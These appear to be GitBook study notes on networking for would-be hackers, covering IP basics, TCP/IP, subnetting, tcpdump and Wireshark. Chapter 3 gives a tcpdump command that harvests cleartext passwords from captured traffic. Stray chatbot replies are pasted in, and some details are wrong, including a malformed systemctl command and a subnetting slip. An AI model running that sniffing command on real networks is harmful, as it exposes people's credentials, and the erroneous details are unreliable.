---
description: Introduction
cover: >-
  https://images.unsplash.com/photo-1544197150-b99a580bb7a8?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHw1fHxuZXR3b3JrfGVufDB8fHx8MTcxODQ3NTM0MXww&ixlib=rb-4.0.3&q=85
coverY: 0
---

# Networking For Hackers

In the world of cybersecurity, mastering networking fundamentals is crucial. These notes cover foundational topics like Network Basics and Sub-netting, essential skills such as Network Analysis and Linux Firewalls, and practical insights into Wi-Fi Networks and Bluetooth Networks. We'll explore protocols like ARP, DNS, SMTP, SNMP, and HTTP, as well as specialized networks such as Automobile Networks and SCADA/ICS Networks.

Join me as we uncover these essential topics to empower your understanding and skills in navigating and securing diverse network environments.



## Content:

1. [Network Basics](networking-for-hackers.md#chapter-1-network-basics)
2. [Sub-netting and CIDR](networking-for-hackers.md#chapter-2-subnetting-and-cidr-notation)
3. [Network Analysis](networking-for-hackers.md#chapter-3-network-analysis)
4. [Linux Firewalls](networking-for-hackers.md#chapter-4-linux-firewalls)
5. [Wi-Fi Networks and Hacking](networking-for-hackers.md#chapter-5-wi-fi-networks-802.11)
6. [Bluetooth Networks](networking-for-hackers.md#chapter-6-bluetooth-networks)
7. [Address Resolution Protocol (ARP)](networking-for-hackers.md#chapter-7-address-resolution-protocol-arp)
8. Domain Name Service (DNS)
9. Server Message Block (SMB)
10. SMTP
11. SNMP
12. HTTP
13. Automobile Networks
14. SCADA/ICS Networks
15. Radio Frequency (RF) Networks

## References:

> ['Network Basics For Hackers' - InfoSec Press 2023](https://www.amazon.ae/Network-Basics-Hackers-Networks-Break/dp/B0BS3GZ1R9)

> [Hacktricks](https://book.hacktricks.xyz/)

> [test-your-sysadmin-skills](https://github.com/HexBuddy/test-your-sysadmin-skills)

***



## Chapter 1: Network Basics

### IP Addresses

Internet Protocol addresses (IP addresses) make the world go 'round. Or, at least, enable us to email, Zoom, watch YouTube videos, Tweet, and navigate the web. It's almost as important as the world going around!

<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Each digital device (computer, laptop, phone, tablet, etc.) is assigned an IP address, and this is what enables us to communicate and connect with it. Imagine an IP address as being similar to your house address. Without that address, no one could find you and send you snail mail.

The IP address system we are presently using is known as IP version 4, or IPv4. It is made up of 32 bits of four octets (8 characters) or four groups of 8 bits (on/off switches).

Take, for instance, 192.168.1.101. Each of the numbers between the dots (.) is the decimal equivalent of 8 bits. This means that we calculate the base 2 number (that computers use) represented by the 8 bits and convert them to decimal numbers that humans are more accustomed to working with (see the diagram below). Each one of the octets (8 bits) is capable of representing numbers within the range 0 through 255 (2 to the 8th power).

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Classes of IP Addresses

IP addresses are generally put into three classes, A, B, and C. The ranges of the classes are as follows:

* Class A: 0.0.0.0 - 127.255.255.255
* Class B: 128.0.0.0 - 191.255.255.255
* Class C: 192.0.0.0 - 223.255.255.255

In Chapter 2, we will address sub-netting and subnet masks that vary with these different IP classes.

### Public vs. Private IP Addresses

It's important to note that our IP address system has its limitations. The most significant restraint is that there are not enough IP addresses to cover all devices that need to connect to the internet. The IPv4 system we are working with now has only 4.3 billion IP addresses. With 7.5 billion people on the planet and far more devices, that certainly is not enough.

As a result, a system was developed to reuse a group of IP addresses within a LAN—that are not usable over the internet. These addresses can be used over and over again within each local area network, but not over the internet, thereby conserving the number of IP addresses necessary to keep the world going 'round.

**These private addresses include:**

* 192.168.0.0 - 192.168.255.255
* 10.0.0.0 - 10.255.255.255
* 172.16.0.0 - 172.16.255.255

You have probably seen the private IP addresses beginning with 192.168.xxx.xxx or 10.xxx.xxx.xxx on your Kali system when you type `ifconfig`.

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

This is your private IP that is only usable on the local area network. To communicate over the internet, your IP address must be translated to a public IP by a NAT device (see NAT below).

### DHCP

Dynamic Host Configuration Protocol (DHCP) assigns IP addresses dynamically. This means that you do not have the same IP address all of the time. Most of the time, these IP address assignments are on a local area network. Remember, on LANs; we use private IP addresses.

When each device is connected to the LAN, it must request an IP address. That device sends the request to the DHCP server that assigns an IP address to that system for a fixed length of time, known as a "lease."

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

Each time you connect to the LAN, you are likely to receive a different (dynamic) IP address, but usually in the same range. For instance, 192.168.0.0 - 192.168.255.255.

### NAT

Network Address Translation (NAT) is a protocol whereby internal private IP addresses are "translated" to an external public IP address that can be routed through the internet to its destination. Remember, private IP addresses of the systems inside the LAN cannot use their IP addresses on the internet because they are not unique (every LAN uses basically the same IP addresses inside their network).

The NAT device accepts requests to traverse the internet from an internal machine. It then records that machine's IP address in a table and converts the IP address to the external IP address of the router. When the packet returns from its destination, the NAT device looks into the saved table of the original request. It forwards the packet to the internal IP address of the system that made the original request within the LAN. When working properly, the individual systems and users don't realize this translation is taking place.

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

For instance, the diagram above shows four computers with private IP addresses behind a device that is serving as both a NAT device and a router (not uncommon). The devices use their private IP addresses within the LAN, but when they want to communicate over the internet, the NAT device translates it to one of the public IP addresses that are unique on the internet. In this way, the routers along the way know exactly where to send the packets.

### Ports

Ports are a kind of sub-address. The IP address is the primary address, and the port is the sub-address. Using a well-worn but effective metaphor, think of the IP address as the street address of a building and then the port as the apartment number. I need the street address to get to the correct building, but I need the apartment address to find the individual person. This is similar to ports. The IP address gets us to the right host, but the port takes us to the proper service, say HTTP on port 80.

There are 65,536 (2 raised to the 16th power) ports. The first 1,024 are generally referred to as the "common ports." Obviously, people don't remember all 65,536 ports (unless they are savant) or even the 1,024 most common ports. As a hacker, security engineer, and/or network engineer, though, there are a few ports that you should know by heart.

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

***

We can use a tool such as `Nmap` to see what ports are open on a system. In this way, the security engineer or hacker can see what ports are open and which services are running on the target system.

For instance, to see all the ports open on a Metasploitable-2 system (an intentionally vulnerable Linux system developed by the good people at Metasploit), we can run the following command:

```bash
kali > sudo nmap –sT <IP address of the target system>
```

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

Nmap then reports back with the open ports and the default service on that port.

***

### **TCP/IP**

Next, I want to introduce you to the basics of TCP/IP, i.e., Transmission Control Protocol (TCP) and Internet Protocol (IP). These are the most common protocols used on the internet for communication.

To become a proficient hacker, forensic investigator, or simply a good network engineer, you should understand the structure and anatomy of these protocols. From my experience, many professionals in these fields do not understand the basics of TCP/IP, which means that you will definitely have an advantage over them if you DO understand.

When trying to create a new hacking tool or investigate a network attack, understanding these protocols and their fields is essential. Otherwise, you will simply be wasting your time.

***

### **What Are Protocols?**

Protocols are simply an agreed-upon way to communicate. For instance, we here on Hackers-Arise have agreed upon the English language with all its rules and grammar as our way to communicate. That is our protocol. If we did not have an agreed-upon way to communicate, people would be using many languages, grammar, and rules, and none of us would understand each other.

Protocols are similar. A protocol simply defines a way of communication with all its rules. These rules are usually defined by an RFC (Request for Comments).

There are many, many protocols in use on the internet. These include TCP, IP, UDP, FTP, HTTP, SMTP, etc., and each has its own set of rules that must be complied with to communicate effectively (similar to the rules we use in communication via written languages).

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Arguably the two most important protocols for use over the internet are IP and TCP, so let's take a look at each of these.

***

### **IP (Internet Protocol)**

**IP**, or Internet Protocol, is the protocol that is used to define the source and destination IP address of a packet as it traverses the internet. It is often used in conjunction with other protocols such as TCP; hence, the often-used conjunction, TCP/IP.

Let's look at an IP packet header and see what information it contains that can be useful to the aspiring hacker and/or forensic investigator.

<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

**Row 1:**

* **Version:** This defines the version of IP, either v4 or v6.
* **IHL:** Defines the header length.
* **Type of Service (TOS):** This defines the type of service of this packet. These include minimize delay, maximize throughput, maximize reliability, and minimize monetary cost.
* **Total Length:** This defines the total length of the IP datagram (including the data) or the fragment. Its maximum value is 65,535.

**Row 2:**

* **Identification:** This field uniquely identifies each packet. It can be critical in reassembling fragmented packets.
* **IP Flags:** This field defines whether the packet is fragmented (M) or not (D). The manipulation of the field can be used to evade IDS and firewalls. Check out my tutorials on nmap and hping3 on how we can manipulate packets to evade intrusion detection systems and other security devices. It can also be used in conjunction with the Window field to identify the operating system of the sender.
* **Fragment Offset:** This field is used when packets are fragmented. It defines where the packets should be reassembled from the beginning of the IP header.

**Row 3:**

* **TTL:** This is the "time to live." This defines how many hops across the internet before the packet expires. It varies by the operating system making it helpful to identify the OS of the sender.
* **Protocol:** This field defines what protocol is being used with IP. Most often, it will be 6 for TCP, 1 for ICMP, 17 for UDP, among others.
* **Header Checksum:** This is an error-checking field. It calculates the checksum (a simple algorithm) to determine the integrity of the data in the header.

**Rows 4 & 5:**

* **Source / Destination:** These rows of the IP header are probably the most important part of the header as it contains the source and destination IP address.

**Row 6:**

* **Options:** This field is variable in length, and its use is optional (as you might expect).
* **Padding:** This field is used to fill out, if necessary, the remaining bits and bytes of the header.

***

### **TCP (Transmission Control Protocol)**

In the TCP header, there are numerous critical fields that the aspiring hacker and/or forensic investigator should understand.

<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

**Row 1:**

* **Source Port / Destination Port:** Probably most importantly, these are the source port and destination port. These fields determine what port the communication came from (source) and where it is going (destination).

**Row 2:**

* **Sequence Number:** The sequence number is generated by the source machine's TCP stack and is used to make certain that packets are arranged in the proper sequence when they arrive. It is also important in defeating MitM attacks.

**Row 3:**

* **Acknowledgment Number:** This is an echo of the Sequence Number sent back by the receiving system. It basically says, "I received the packet with the Sequence #." In this way, the sender knows that the packet has arrived. If the sender does not receive an Acknowledgment Number back in a fixed amount of time, it will resend the packet to make certain the receiver gets the packet. In this way, TCP is reliable (in contrast, UDP does not do this and is, therefore, unreliable).

**Row 4:**

The fourth row has some critical information. Let's skip over the Data Offset and the Reserved fields. That takes us to 8 bits near the middle of Row 4. These are the infamous flags of the three-way handshake and nmap scans.

* The first two bits, **CWR** and **ECE**, are beyond the scope of this lesson. The next six bits are the **URG**, **ACK**, **PSH**, **RST**, **SYN**, and **FIN** flags. These flags are used by TCP to communicate:
  * **SYN:** The opening of a new connection.
  * **FIN:** The normal, "soft" closing of a connection.
  * **ACK:** The acknowledgment of a packet. All packets after the three-way handshake should have this bit set.
  * **RST:** The hard-close of a connection and is usually used to communicate that the packet has arrived at the wrong port or IP.
  * **URG:** This flag indicates that the following data is urgent.
  * **PSH:** Push the data past the buffer to the application.

If you are familiar with nmap or hping3 as recon tools, you have used scans utilizing all of these flags. By creating packets with flag combinations that should not be seen in the wild, we may be able to elicit a response from a very secure system or even evade detection.

* **Window Size:** In some diagrams, this is simply described as the Window field. Its role is to communicate the size of the window that the TCP stack has to buffer packets. This is the way that TCP manages flow control. From a recon or forensics perspective, this field alone can be enough to identify the OS that sent the packet. This field varies from OS to OS and even from SP to SP. Given this bit of information, one can predict with about 80% accuracy the OS that sent the packet. In fact, it is this field and a few others (DF and TTL in the IP header) that operating system fingerprinters such as p0f use to identify the OS.

**Row 5:**

* **Checksum:** This field uses a simple algorithm to check for errors. In essence, it is an integrity checker.
* **URG Pointer:** This field points to the last byte of the sequence number of urgent data. The URG flag must be set in conjunction to activate this field.

**Row 6:**

* **Options:** Like the IP header, the TCP header has an options field to be used if necessary, and it is varying length.
* **Padding:** The padding is necessary to bring the TCP header to a multiple of 32 bits.

***

### **TCP Three-Way Handshake**

Every TCP connection starts with a three-way handshake. The handshake begins with a client sending a packet with the SYN flag set saying, “Hello, I want to talk to you.” The server responds with a packet with the SYN and ACK flags set saying, “Hi, I’m willing and able to chat.” Finally, the client sends a packet with the ACK flag set that acknowledges the response of the server, and then the data transfer can begin.

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

***

### **UDP**

**User Datagram Protocol** or **UDP** is a connectionless protocol (vs. TCP, which is connection-oriented and requires a connection such as the three-way handshake as seen above). It is more lightweight than TCP since it doesn’t have the overhead of assuring a connection and making certain that each packet arrives. UDP simply sends packets and forgets about them. This works great in applications where you want efficiency and no one packet

is critical to the application (such as streaming audio and video, DNS, SNMP, NTP, etc.), but it does not work well in applications where each packet is critical.

We can scan for UDP ports using nmap by using the –sU switch.

```bash
kali > nmap –sU <target IP>
```

UDP scans tend to take a bit longer than TCP scans as it has no equivalent of the TCP three-way handshake that confirms a port is open.

***

### **Network Topologies**

The topology is the way that systems connect together, which can be either physical or logical. The five primary topologies include bus, ring, star, mesh, and hybrid.

* **Bus Topology:** This topology has one central cable that connects all devices in a network and is most common in smaller networks. Its simplicity makes it easy to install, but its single point of failure can lead to significant downtime.

<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

* **Ring Topology:** In this topology, each node connects to exactly two other nodes, forming a single continuous pathway for signals through each node. The advantage is that it is relatively easy to install and reconfigure, but a break in any one of the connections can disrupt the entire network.

<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

* **Star Topology:** This topology has each node connected to a central hub or switch, which acts as a repeater for data flow. It is the most common computer network topology today. Its main advantage is that it is easy to add or remove devices, and if one link fails, the others remain unaffected. However, the central hub represents a single point of failure.

<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

* **Mesh Topology:** This topology has each node connected to every other node, providing the most redundancy and reliability. The mesh network allows for continuous connections and reconfiguration around broken or blocked paths by “hopping” from node to node until the destination is reached. It is very robust and provides high redundancy but is the most costly and complex to install.

<figure><img src="../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

* **Hybrid Topology:** This topology combines multiple topologies to leverage the strengths of each.

***

### **OSI Model**

The OSI and the TCP models are the most common models to understand the way that these various protocols work together. Many novices tend to minimize the importance of these models as they initially don’t seem to have any practical importance to networking systems. In reality, you should at least have a basic understanding of these models as you will hear references to them repeatedly in your career, such as, “this is a layer three switch.” This would be unintelligible without a rudimentary understanding of the OSI model.

Let’s begin with the OSI model. The diagram below displays the seven layers and the basic use of that layer in network communication.

<figure><img src="../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

***

Certainly! Below is the text you provided, formatted for easier reading in GitBook while maintaining the original wording:

***

#### **The OSI Model**

As you can see, there are seven layers to the OSI model:

1. **Application Layer**
2. **Presentation Layer**
3. **Session Layer**
4. **Transport Layer**
5. **Network Layer**
6. **Data Link Layer**
7. **Physical Layer**

The figure above details the various layers and the protocols and activities associated with each.

To help you remember the various layers of this model, there are at least two mnemonic devices:

If we start from the top and work our way down, we can take the first letter of each layer, namely, **A**, **P**, **S**, **T**, **N**, **D**, and **P**. Many people remember these layers by using the mnemonic device:

**All People Seem To Need Data Processing.**

If you remember that phrase, you can likely remember the various layers.

If we work our way up the model, we get **P**, **D**, **N**, **T**, **S**, **P**, and **A**. Then we use the phrase:

**Please Don’t Throw Sausage Pizza Away.**

Feel free to use either or make up your own. The key is to remember the seven layers. I hope this helps.

***

#### **The OSI Model from a Cybersecurity Perspective**

The attacks against the protocols in this model can be categorized as follows:

<figure><img src="../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

**Application Layer:**\
Generally includes applications such as browsers, word processors, and other applications. This layer’s most important attacks are likely to be exploits. These are attacks that can often embed the hacker’s code within the application to take control of the application and the system.

**Presentation Layer:**\
The most concerning attack is phishing or sending emails to various people with malicious links.

**Session Layer:**\
The most important attack is hijacking, where an attacker can take over an existing session established legitimately by the user.

**Transport Layer:**\
The hacker often does their reconnaissance at this layer.

**Network Layer:**\
Attackers can conduct Man-in-the-Middle (MiTM) attacks, placing themselves between a legitimate user and a server, thereby eavesdropping on the traffic and possibly even altering it.

**Data Link Layer:**\
The attacker can spoof the MAC addresses, the globally unique address stamped on every networked device and essential to the proper functioning of a LAN (see ARP).

**Physical Layer:**\
This layer can be attacked using sniffing. Sniffing is the practice of watching and analyzing network traffic (see Wireshark and Sniffers in Chapter 4).

We will look more closely at each of the attacks against the network protocols and layers as we proceed through this book.

***

### **Exercises**

1. **What is the difference between public and private IP addresses? Is 172.16.242.63 a public or private IP address?**
2. **Use `ifconfig` to determine what IP address your system is using.**
3. **Do an nmap scan against your system. What ports are open?**
4. **What are the 6 TCP flags, and what are they used to do?**
5. **What are the most common attacks against the network layer?**

***

## Chapter 2: Subnetting and CIDR Notation

### **Why Sub-netting?**

Subnetting lets network administrators use the 32 bits in IPv4 IP address space more efficiently. They can create subnets within a Class A, B, or C network, enabling the administrator to create networks with more realistic host numbers.

Subnetting provides a flexible way to designate which portion of the IP address represents the host IP and which portion represents the network ID. Even if a single organization has thousands of devices, they don’t want them all running on the same network ID. The network would slow dramatically. By dividing up the network, you can have different physical networks and broadcast domains.

<figure><img src="../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

***

### **Subnets**

A subnet is a network within a network, namely a Class A, B, or C. Subnets are created by using one or more of the host bits to extend the network ID. As you know:

* **Class A networks** have an 8-bit network ID.
* **Class B networks** have a standard 16-bit network ID.
* **Class C networks** have a standard 24-bit network ID.

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Subnetting enables us to create network IDs of any size.

A network mask, or netmask, is a binary mask that is applied to an IP address to determine whether two IP addresses are in the same subnet. A network mask works by applying binary AND operations between the IP address and the mask.

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

***

#### **Subnet Masks**

Subnet masks use the 32-bit structure of the IP address. The subnet mask tells us which bits are for the Network ID and which bits are for the host ID. When the subnet mask bit is set to one, this means it is part of the network. A bit marked as zero is part of the host ID. The diagram below is meant to demonstrate this process of bit-wise AND operation between an IP address and its mask.

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

***

#### **CIDR Notation**

CIDR, or Classless Inter-Domain Routing notation, is a way of representing an IP address and the network mask associated with it. CIDR notation specifies an IP address, a slash (/), and a decimal number such as `192.168.1.0/24`, where the 24 represents the number of bits in the network mask. Of course, the number of bits can vary depending on the number of subnets.

***

#### **Our Scenario**

To demonstrate this principle, let's create a scenario. Assume we have a Class C network, say `192.168.1.0`. That means we have 254 host addresses available (1-254). What if we needed five different networks with no more than 30 hosts per network?

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

We can create smaller networks by borrowing bits from the host portion of the address.&#x20;

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

This provides us with a netmask like the one below.&#x20;

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Those 3 bits would give us (2^3 = 8) (subtracting 2 for the reserved network and broadcast IP) subnets or 6. There would be 5 bits left in the network portion of the address or (2^5 = 32) (subtracting 2) or 30 hosts per subnet.

The calculation of the subnet mask after borrowing those 3 bits would be:

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

***

#### **Summary**

Subnetting is a key skill for every network engineer or anyone trying to do network forensics or network analysis. Hopefully, this brief chapter sheds some light on the subject and at least leaves you conversant in this subject matter.

***

## Chapter 3: Network Analysis

#### Command Line Tools

Command-line tools are essential for network management and security analysis. This section covers key tools such as `ifconfig`, `ping`, `netstat`, `tcpdump`, and `Wireshark`, along with practical examples and exercises for hands-on experience.

**1. `ifconfig`**

The `ifconfig` command in Linux is used to configure and display network interfaces.

```bash
kali > ifconfig
```

When running `ifconfig`, you will see various details:

* **IPv4 Private IP Address**: Displayed as `inet` followed by the address (e.g., `192.168.1.100`).
* **Netmask**: Shown as `netmask` (e.g., `255.255.255.0`).
* **Broadcast IP Address**: Listed as `broadcast` (e.g., `192.168.1.255`).
* **IPv6 Address**: Displayed as `inet6` followed by the address (e.g., `fe80::1c2d:44ff:fe72:3420`).
* **MAC Address**: Shown as `ether` followed by the address (e.g., `00:0c:29:4b:8e:9f`).
* **Loopback IP Address**: Usually `127.0.0.1` for localhost.

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

**2. `ping`**

The `ping` command checks the connectivity to a domain or IP address. It sends ICMP echo requests and receives echo replies.

```bash
kali > ping hackers-arise.com
```

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

* To ping by IP address:

```bash
kali > ping 185.230.63.107
```

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

**3. `netstat`**

`netstat` provides network statistics and information about network connections, routing tables, interface statistics, masquerade connections, and multicast memberships.

* To show all connections:

```bash
kali > netstat -a
```

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

* To display TCP connections only:

```bash
kali > netstat -t
```

* To display UDP connections only:

```bash
kali > netstat -u
```

* To display listening connections:

```bash
kali > netstat -l
```

* To find a specific connection, use `grep`:

```bash
kali > netstat -a | grep http
```

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

**4. `ss`**

`ss` is similar to `netstat` but provides more detailed information in a readable format.

```bash
kali > ss
```

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Apologies for the confusion earlier. Here's the excerpt you provided about network sniffers:

***

### **Network Sniffers**

A network sniffer—sometimes referred to as a packet analyzer, protocol analyzer, or network traffic analyzer—can intercept and analyze network traffic that traverses a digital network. These sniffers can be invaluable to the network or security engineer, the forensic investigator, and in some cases, the hacker. For instance, if an application sends passwords over the network unencrypted, the hacker may be able to sniff and view the passwords. Since only a few applications send passwords unencrypted in our security-conscious era, the value of the sniffer to the hacker is a bit more nuanced. For some exploits/hacks, such as DNS or MiTM attacks, analysis of the LAN traffic can be crucial to their success, making the sniffer invaluable. Besides, sniffing a target’s traffic can reveal what sites they are visiting, their cookies, their user agent, or even their email messages (if unencrypted or you have the resources to decrypt the message). Many tools are capable of network sniffing, including:

1. SolarWinds Deep Packet Inspection and Analysis Tool
2. Tcpdump
3. Windump
4. Wireshark
5. Network Miner
6. Capsa
7. tshark

In this chapter, we use two of the most popular network sniffer/analyzers: tcpdump and Wireshark. In addition, we use Wireshark to dig deep into the NSA’s EternalBlue exploit to understand exactly how it works.

***

### **tcpdump**

`tcpdump` is a command-line packet analyzer tool. It captures and displays packet data for network traffic analysis.

* To start capturing:

```bash
kali > tcpdump
```

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

* Simple Example :&#x20;

```
kali > ping 192.168.0.114
kali > tcpdump
```

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

As you can see, tcpdump displays the protocol (ICMP) and the type (echo request and echo reply). If we want to capture the output to a file where we can analyze it at a later time, we can use the –w option followed by the file name.

* To write capture to a file:

```bash
kali > tcpdump -w myoutput.cap
```

* To filter traffic by IP address:

```bash
kali > tcpdump host 192.168.0.114
```

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

* To filter traffic by port:

```bash
kali > tcpdump port 80
```

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

* To filter by TCP flags:

```bash
kali > tcpdump 'tcp[tcpflags] == tcp-syn'
```

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

* To combine filters:

```bash
kali > tcpdump host 192.168.0.114 and port 80
```

Now, let's connect to the Apache web server on our Kali machine from your Windows 7 system. First, start the Apache2 web server built into Kali.

```
kali > systemctl apache2 start
```

This starts your Apache web server. Next, start tcpdump again on your Kali system.

```
kali > tcpdump host 192.168.0.114
```

Now, open a browser on your Windows 7 system and navigate to the Kali system IP address. You should begin to see packets appearing in the tcpdump terminal.

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Note that we can see the three-way TCP handshake in the highlighted polygon. You can see first an “S” flag, then an “S.” flag (tcpdump represents the A or ACK flag with a “ .“), and then a “.” flag or written another way, S-SYN/ACK-ACK.

This filter displays traffic coming and going from our Windows 7 system. If we want to filter for just the traffic coming FROM our Windows 7 system, we can create a filter like;

```
kali > tcpdump src host 192.168.0.114
```

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

Now, we are only seeing the traffic coming (src) from our Windows 7 system (192.168.0.114).

Of course, we can create a filter for each of the TCP flags, such as;

```
kali > tcpdump ‘tcp[tcpflags]==tcp-ack’
kali > tcpdump ‘tcp[tcpflags]==tcp-fin’
kali > tcpdump ‘tcp[tcpflags]==tcp-rst’
kali > tcpdump ‘tcp[tcpflags]==tcp-psh’
kali > tcpdump ‘tcp[tcpflags]==tcp-urg’:
```

1.  **Filtering for passwords in cleartext:**

    ```bash
    kali > tcpdump port 80 or port 21 or port 25 or port 110 or port 143 or port 23 -lA | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|password='
    ```

    Explanation:

    * This command captures traffic on ports commonly associated with unencrypted password transmission (HTTP, FTP, SMTP, POP3, IMAP, Telnet).
    * `-lA`: This tcpdump option ensures that the output is printed immediately (line buffered) and prints ASCII instead of hex.
    * `egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|password='`: This filters the captured packets for common patterns indicating login credentials.
2.  **Filtering for user agent:**

    ```bash
    kali > tcpdump -vvAls | grep 'User-Agent'
    ```

    Explanation:

    * This command captures detailed traffic (very verbose) and searches for the 'User-Agent' header, which identifies the user's browser and operating system.

    <figure><img src="../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

### **Wireshark**

Wireshark is a GUI-based network protocol analyzer that captures and interactively displays network traffic.

* To start Wireshark:

```bash
kali > wireshark
```

* Select the network interface to capture traffic.
* Use the filter bar to narrow down the packets of interest (e.g., `tcp`, `ip.addr == 192.168.1.107`).

You're right; the initial summary omitted some specifics from your detailed text. Here's a revised, comprehensive version that includes all relevant parts, tables, commands, and examples:

**Starting Wireshark** Upon opening, Wireshark asks you to choose a network interface:

* For VMs, select `eth0`.
* For physical machines with a wireless adapter, select `wlan0`. Identify the most active adapter for effective sniffing.

**Packet Capture Format** Wireshark captures packets and stores them in `.pcap` format, used across the industry in tools like Snort and aircrack-ng.

**Wireshark Interface**

1. **Packet List Pane**: Displays real-time color-coded packet flow.
2. **Packet Details Pane**: Shows headers of the selected packet.
3. **Packet Bytes Pane**: Provides payload in hexadecimal (left) and ASCII (right).

**Creating Filters** To manage traffic effectively, Wireshark supports various filters:

**Protocol Filter**

* **Example**: `tcp` (turns green if syntax is correct).
* Apply by clicking the arrow next to the filter bar.

**IP Address Filter**

* **Example**: `ip.addr == 192.168.1.107`
* Shows traffic involving the specified IP.

**Port Filter**

* **Example**: `tcp.dstport == 80`
* Filters TCP traffic to port 80.

**Payload Content Filter**

* **Example**: `tcp contains facebook`
* Filters packets with "facebook" in the payload.

**Expression Window** For complex filtering:

1. Click the **Expression** tab.
2. Select a field, a relation (like ==, !=, >, <), and a value.

**Examples**:

* **TCP RST Flag**: `tcp.flags.rst == 1`

**Following Streams** To trace a communication stream:

1. Right-click a packet.
2. Choose "Follow" > "TCP Stream."

This shows the entire communication content in the stream, including ASCII and byte counts.

**Statistics** Wireshark also provides statistical analysis:

1. Click the **Statistics** tab.
2.  Navigate to IPv4 Statistics > All Addresses.

    This displays IP activity and basic statistics.

Wireshark filtering examples:

* Filter by protocol (TCP):

```plaintext
tcp
```

<figure><img src="../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

* Filter by IP address:

```plaintext
ip.addr == 192.168.1.107
```

<figure><img src="../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

* Filter by port:

```plaintext
tcp.dstport == 80
```

<figure><img src="../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

* Filter for strings in payload:

```plaintext
tcp contains facebook
```

<figure><img src="../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

* Create filters using the Expression window:

<figure><img src="../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

* Follow a TCP stream by right-clicking a packet and selecting `Follow` > `TCP Stream`.

<figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

* This opens a pull-down window like that above. Click "Follow" and then "TCP Stream." :&#x20;

<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

* Obtain statistics via `Statistics` > `IPv4 Statistics` > `All Addresses`.

<figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

***

### **Exercises:**

1. Use tcpdump to filter out all traffic not coming or going to your IP address.
2. Connect to hackers-arise.com. Now use Wireshark to filter out any traffic not coming from the hackers-arise.com website.
3. Use Wireshark to filter for traffic that has the word “hacker” in it.
4. Use netstat to find all the connections to your system.

***

## Chapter 4: Linux Firewalls

### **Introduction to Linux Firewalls**

Understanding networking and network packets is essential for securing your network. A firewall is a critical security measure that helps in protecting systems and networks from unauthorized access. Linux offers several firewall solutions that are cost-effective alternatives to commercial systems, provided you have the necessary knowledge and training.

**Types of Firewalls**

Firewalls can be either software or hardware-based:

* **Hardware-based**: Used to protect entire networks and connected devices.
* **Software-based**: Installed on individual systems to protect the host system.

### **Iptables: Overview and Basics**

Iptables is a powerful firewall utility for Linux and Unix-like operating systems. Developed by the Netfilter project, it has been part of the Linux kernel since January 2001. Iptables uses command-line tools to configure policy chains for filtering network traffic.

<figure><img src="../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

**Key Concepts of Iptables**

1. **Tables**: Organize functionalities such as packet filtering and NAT (Network Address Translation).
   * **FILTER**: Default table for packet filtering.
